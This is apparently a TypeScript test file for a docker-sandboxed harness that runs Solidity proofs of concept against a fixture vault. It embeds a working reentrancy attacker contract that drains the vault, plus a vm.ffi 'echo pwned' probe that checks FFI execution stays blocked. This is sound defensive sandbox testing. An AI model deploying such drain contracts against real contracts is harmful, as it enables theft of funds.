// SPEC-3 §2 — the REAL container harness, docker-gated. Everything here runs
// the actual `rextor/analyzer` image (daemon probed first, graceful skip per
// SPEC-1 invariant 4); the anvil E2E is ADDITIONALLY opt-in via REXTOR_SIM_E2E
// (SPEC-3 acceptance). Offline behavior is covered in sim.test.ts.
import { describe, expect, it } from "vitest";
import { execFile } from "node:child_process";
import { chmod, cp, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { randomUUID } from "node:crypto";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { parseForgeJson, runSimContainer, simTmpBase } from "../src/sim";

const execFileP = promisify(execFile);

const FIXTURES_VAULT = fileURLToPath(new URL("../../../fixtures/vault", import.meta.url));
const dockerUp = async (): Promise<boolean> => {
  try {
    await execFileP("docker", ["info"], { timeout: 20_000 });
    return true;
  } catch {
    return false;
  }
};
// SPEC-3 acceptance: the anvil E2E is opt-in (adversarial runs docker-gated).
const maybeIt = process.env.REXTOR_SIM_E2E === "1" ? it : it.skip;

// The proving exploit, mirrored from fixtures/vault/test/Vault.t.sol (Week-1:
// 2-ETH vault drained via reentrancy) and adapted to the RextorPocTest shape.
// The test PASSES only when the bug reproduces (SPEC-3 §1).
const VAULT_DRAIN_POC = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";
import {Vault} from "src/Vault.sol";

contract ReentrantAttacker {
    Vault private immutable vault;
    constructor(Vault v) { vault = v; }
    receive() external payable {
        if (address(vault).balance >= 1 ether) vault.withdraw();
    }
}

contract RextorPocTest is Test {
    function testRextorPoc_0() public {
        Vault v = new Vault();
        v.deposit{value: 1 ether}();
        ReentrantAttacker attacker = new ReentrantAttacker(v);
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        v.deposit{value: 1 ether}();
        vm.prank(address(attacker));
        v.withdraw();
        assertGt(address(attacker).balance, 1 ether, "drain failed");
    }
}
`;

// Adversarial biconditional (SPEC-3 §2): testRextorPoc_0 PASSES only if vm.ffi
// executes. FOUNDRY_FFI must make it revert, so `results === false` is a proof
// of denial — not of a compile failure, which the control test rules out.
const FFI_PROBE_POC = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";

contract RextorPocTest is Test {
    function test_controlHarnessRan() public {
        assertTrue(true);
    }

    function testRextorPoc_0() public {
        string[] memory inputs = new string[](2);
        inputs[0] = "echo";
        inputs[1] = "pwned";
        bytes memory res = vm.ffi(inputs);
        assertTrue(res.length > 0, "vm.ffi must be denied");
    }
}
`;

// Container command for the E2E: start a local anvil, prove it is serving,
// mine one block (fresh anvil sits at 0 — the test pins block > 0), then hand
// over to the same entrypoint the production harness uses.
const ANVIL_THEN_SIM = `
anvil --port 8545 --silent >/poc/anvil.log 2>&1 &
i=0; until cast block-number --rpc-url http://127.0.0.1:8545 >/dev/null 2>&1; do
  i=$((i+1)); [ "$i" -gt 120 ] && { echo anvil-not-ready >&2; exit 1; }; sleep 0.5
done
cast rpc --rpc-url http://127.0.0.1:8545 evm_mine >/dev/null || true
exec /usr/local/bin/sim.sh
`;

interface AnvilRunOutcome {
  block: number;
  results: Record<string, boolean>;
  stderr: string;
}

/** Same docker invocation hardening as runSimContainer (:ro repo, overlay
 *  mount, FOUNDRY_FFI=false, 240s execFile timeout with SIGKILL), but the
 *  container starts anvil first and FORK_URL points at it in-process. */
async function runSimContainerAnvil(repoDir: string, pocSource: string): Promise<AnvilRunOutcome> {
  const pocDir = await mkdtemp(join(simTmpBase(), "rextor-sim-e2e-"));
  try {
    // The image runs as the unprivileged analyzer user (uid 1000); mode 0777
    // lets it write artifacts through the bind mount (colima maps host perms).
    await chmod(pocDir, 0o777);
    await writeFile(join(pocDir, "RextorPoc.t.sol"), pocSource, "utf8");
    await execFileP(
      "docker",
      [
        "run", "--rm",
        "--network", "bridge",
        "-v", `${resolve(repoDir)}:/repo:ro`,
        "-v", `${pocDir}:/poc`,
        "-e", "FORK_URL=http://127.0.0.1:8545",
        "-e", "FOUNDRY_FFI=false",
        "--entrypoint", "sh", "rextor/analyzer",
        "-c", ANVIL_THEN_SIM,
      ],
      { timeout: 240_000, killSignal: "SIGKILL" },
    );
    const block = parseInt((await readFile(join(pocDir, "block.txt"), "utf8")).trim(), 10);
    const raw = await readFile(join(pocDir, "result.json"), "utf8");
    const stderr = await readFile(join(pocDir, "stderr.txt"), "utf8");
    return { block: Number.isFinite(block) ? block : 0, results: parseForgeJson(raw), stderr };
  } finally {
    await rm(pocDir, { recursive: true, force: true }).catch(() => {});
  }
}

/** Standalone anvil container for the adversarial run; returns its bridge IP. */
async function startAnvilContainer(): Promise<{ name: string; ip: string }> {
  const name = `rextor-sim-anvil-${randomUUID().slice(0, 8)}`;
  await execFileP("docker", [
    "run", "-d", "--rm", "--name", name,
    "--entrypoint", "sh", "rextor/analyzer",
    "-c", "anvil --host 0.0.0.0 --port 8545 --silent",
  ]);
  // evm_mine doubles as the readiness probe: it only succeeds once anvil is
  // serving, and it bumps the tip off block 0 so the block pin is assertable.
  let ready = false;
  for (let i = 0; i < 60 && !ready; i++) {
    // Real interval: the awaited condition lives in an EXTERNAL docker/anvil
    // process — fake timers cannot advance it. Executor form, since the
    // project's TS lib (es2022) lacks Promise.withResolvers.
    await new Promise((r) => setTimeout(r, 500));
    ready = await execFileP("docker", [
      "exec", name, "cast", "rpc", "--rpc-url", "http://127.0.0.1:8545", "evm_mine",
    ]).then(() => true, () => false);
  }
  if (!ready) throw new Error(`anvil container ${name} never became ready`);
  // docker 29 (colima): the legacy top-level NetworkSettings.IPAddress is
  // empty; the address lives under the per-network map.
  const ip = (await execFileP("docker",
    ["inspect", "-f", "{{(index .NetworkSettings.Networks \"bridge\").IPAddress}}", name])).stdout.trim();
  return { name, ip };
}

describe("runSimContainer (docker-gated)", () => {
  maybeIt("runs a passing PoC against a local anvil fork → confirmed", async () => {
    if (!(await dockerUp())) return; // graceful skip
    const out = await runSimContainerAnvil(FIXTURES_VAULT, VAULT_DRAIN_POC);
    expect(out.block).toBeGreaterThan(0);
    expect(out.results["testRextorPoc_0"]).toBe(true);
  }, 300_000);

  it("adversarial: PR foundry.toml ffi=true + vm.ffi PoC → ffi must stay denied", async () => {
    if (!(await dockerUp())) return; // graceful skip
    // Fixture copy with the PR-controlled ffi = true appended; the fixture's
    // own test file is dropped so the PoC is the only thing under test.
    const fixtureCopy = await mkdtemp(join(simTmpBase(), "rextor-sim-ffi-"));
    await cp(FIXTURES_VAULT, fixtureCopy, { recursive: true });
    await rm(join(fixtureCopy, "out"), { recursive: true, force: true });
    await rm(join(fixtureCopy, "cache"), { recursive: true, force: true });
    await rm(join(fixtureCopy, "test", "Vault.t.sol"));
    const toml = await readFile(join(fixtureCopy, "foundry.toml"), "utf8");
    await writeFile(join(fixtureCopy, "foundry.toml"), `${toml}ffi = true\n`, "utf8");

    const anvil = await startAnvilContainer();
    try {
      // Control passing proves fixture + harness are healthy; therefore _0's
      // failure can ONLY be the vm.ffi revert — FFI denial (patched config +
      // FOUNDRY_FFI env) beat the PR's ffi = true.
      const out = await runSimContainer(fixtureCopy, FFI_PROBE_POC, `http://${anvil.ip}:8545`);
      expect(out.results["test_controlHarnessRan"]).toBe(true);
      expect(out.results["testRextorPoc_0"]).toBe(false);
      expect(out.block).toBeGreaterThan(0);
    } finally {
      await execFileP("docker", ["stop", "-t", "2", anvil.name]).catch(() => {});
      await rm(fixtureCopy, { recursive: true, force: true }).catch(() => {});
    }
  }, 300_000);
});
